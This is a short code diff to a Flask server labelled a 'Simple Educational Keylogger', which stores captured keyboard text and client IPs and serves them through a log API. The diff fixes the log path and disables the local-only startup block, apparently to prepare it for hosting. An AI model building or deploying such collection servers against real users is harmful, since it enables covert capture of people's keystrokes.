@@ -3,7 +3,9 @@ from datetime import datetime
 import os
 
 app = Flask(__name__)
-LOG_FILE = 'keyboard_capture.txt' # File to store the logged text
+
+# LOG_FILE = 'keyboard_capture.txt' # File to store the logged text (locally)
+LOG_FILE = os.path.join(os.path.dirname(__file__), 'keyboard_capture.txt')
 
 """Get client IP address, handling proxies"""
 def get_client_ip():
@@ -83,8 +85,10 @@ def api_logs():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
+""" For local testing
 if __name__ == '__main__':
     print("Starting Simple Educational Keylogger Server...")
     print("Access the dashboard at: http://127.0.0.1:5000")
     print("View raw data at: http://127.0.0.1:5000/api/logs")
     app.run(debug=True)
+"""
